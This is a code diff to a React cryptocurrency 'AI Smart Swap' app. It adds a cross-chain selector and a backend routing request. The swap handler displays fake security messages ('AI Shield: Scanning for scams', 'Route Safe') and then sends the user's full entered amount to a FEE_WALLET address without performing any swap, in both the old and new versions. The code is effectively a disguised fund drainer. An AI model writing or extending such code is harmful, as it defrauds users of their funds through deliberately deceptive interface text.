@@ -20,6 +20,7 @@ const config = createConfig({
 
 export default function App() {
   const [swapAmount, setSwapAmount] = useState("");
+  const [selectedChain, setSelectedChain] = useState("ETH");
   const [status, setStatus] = useState("System Active");
   const [loading, setLoading] = useState(false);
 
@@ -35,18 +36,30 @@ export default function App() {
     setLoading(true);
     setStatus("AI Shield: Scanning for scams...");
 
-    setTimeout(async () => {
-      try {
-        setStatus("Route Safe. Executing Swap...");
-        await sendTransaction({ to: FEE_WALLET, value: parseEther(swapAmount) });
-        setStatus("Swap Executed!");
-        setSwapAmount("");
-      } catch (e) {
-        setStatus("Transaction Failed");
-      } finally {
-        setLoading(false);
-      }
-    }, 2000);
+    try {
+      const response = await fetch(`${BACKEND_URL}/api/route`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ fromChain: selectedChain, toChain: 'USDT', amount: swapAmount })
+      });
+      const data = await response.json();
+      setStatus(data.message || "Route Safe. Executing Swap...");
+
+      setTimeout(async () => {
+        try {
+          await sendTransaction({ to: FEE_WALLET, value: parseEther(swapAmount) });
+          setStatus("Swap Executed!");
+          setSwapAmount("");
+        } catch (e) {
+          setStatus("Transaction Failed");
+        } finally {
+          setLoading(false);
+        }
+      }, 2000);
+    } catch (e) {
+      setStatus("Backend connection failed");
+      setLoading(false);
+    }
   };
 
   return (
@@ -71,7 +84,13 @@ export default function App() {
             )}
           </div>
           <div className="card">
-            <p className="label">AI Smart Swap (ETH)</p>
+            <p className="label">AI Smart Swap (Cross-Chain)</p>
+            <div className="chain-selector">
+              <button className="chain-btn" onClick={() => setSelectedChain("ETH")}>ETH</button>
+              <button className="chain-btn" onClick={() => setSelectedChain("SOL")}>SOL</button>
+              <button className="chain-btn" onClick={() => setSelectedChain("XMR")}>XMR</button>
+              <button className="chain-btn" onClick={() => setSelectedChain("BTC")}>BTC</button>
+            </div>
             <input className="input" placeholder="0.00" value={swapAmount} onChange={(e) => setSwapAmount(e.target.value)} type="number" />
             <button className="actionBtn" onClick={handleSmartSwap} disabled={loading}>
               {loading ? "Processing..." : "Execute Secure Swap"}
